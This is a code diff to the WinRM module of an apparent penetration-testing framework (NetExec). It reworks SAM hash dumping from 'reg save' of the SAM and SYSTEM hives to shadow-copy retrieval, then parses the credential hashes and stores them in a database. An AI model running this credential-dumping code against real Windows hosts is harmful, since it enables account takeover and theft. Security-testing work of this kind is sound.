@@ -27,6 +27,7 @@ from nxc.connection import connection, requires_admin
 from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.logger import highlight
 from nxc.helpers.misc import gen_random_string
+from nxc.protocols.winrm.remoteops import RemoteOperations
 from nxc.helpers.negotiate_parser import parse_challenge
 from nxc.logger import NXCAdapter
 from nxc.paths import TMP_PATH
@@ -47,6 +48,7 @@ class winrm(connection):
         self.targetDomain = None
         self.no_ntlm = False
         self.shell_types = []
+        self._remote_ops = None
 
         connection.__init__(self, args, db, host)
 
@@ -566,36 +568,54 @@ class winrm(connection):
     # but in here, it isn't not a tty shell, pypsrp will do a crazy loop command execution when it didn't get any response (stuck in "Yes/No" prompt)
     # and it will make target host OOM error just like dos attack.
     # To prevent that, just make the store file name randomly.
+    @property
+    def remote_ops(self):
+        if self._remote_ops is None:
+            self._remote_ops = RemoteOperations(self)
+        return self._remote_ops
+
+    @requires_admin
     def sam(self):
-        sam_storename = gen_random_string(6)
-        system_storename = gen_random_string(6)
-        dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
-        clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
+        def add_sam_hash(sam_hash):
+            self.logger.highlight(sam_hash)
+            if "_history" in sam_hash:
+                return
+            username, _, lmhash, nthash, _, _, _ = sam_hash.split(":")
+            add_sam_hash.sam_hashes += 1
+            self.db.add_credential(
+                "hash",
+                self.hostname,
+                username,
+                f"{lmhash}:{nthash}",
+                pillaged_from=host_id,
+            )
+
+        add_sam_hash.sam_hashes = 0
         output_filename = self.output_file_template.format(output_folder="sam")
+
         try:
-            self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
-            self.conn.fetch(f"C:\\windows\\temp\\{sam_storename}", output_filename + ".sam")
-            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", output_filename + ".system")
-            self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
-        except Exception as e:
-            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
-                self.logger.fail("Failed to dump SAM hashes, it may have been detected by AV or current user is not privileged user")
-            elif hasattr(e, "code") and e.code == 5:
-                self.logger.fail(f"Dump SAM hashes with {self.args.dump_method} failed, please try '--dump-method'")
-            else:
-                self.logger.fail(f"Failed to dump SAM hashes, error: {e!s}")
-        else:
-            self.logger.display("Dumping SAM hashes")
-            local_operations = LocalOperations(f"{output_filename}.system")
-            boot_key = local_operations.getBootKey()
+            bootkey = self.remote_ops.get_bootkey(output_filename)
+            if bootkey is None:
+                return
+
+            sam_hive_path = f"{self.remote_ops.shadow_copy_path}" + r"\Windows\System32\config\SAM"
+            if not self.remote_ops.get_file(sam_hive_path, f"{output_filename}.sam"):
+                self.logger.fail("Could not get SAM hive")
+                return
+
+            host_id = self.db.get_hosts(self.host)[0][0]
             SAM = SAMHashes(
                 f"{output_filename}.sam",
-                boot_key,
+                bootkey,
                 isRemote=None,
-                perSecretCallback=lambda secret: self.logger.highlight(secret),
+                perSecretCallback=lambda secret: add_sam_hash(secret),
             )
+            self.logger.display("Dumping SAM hashes")
             SAM.dump()
             SAM.export(output_filename)
+            self.logger.success(f"Dumped {highlight(add_sam_hash.sam_hashes)} SAM hashes to {output_filename + '.sam'}")
+        finally:
+            self.remote_ops.finish()
 
     def lsa(self):
         security_storename = gen_random_string(6)
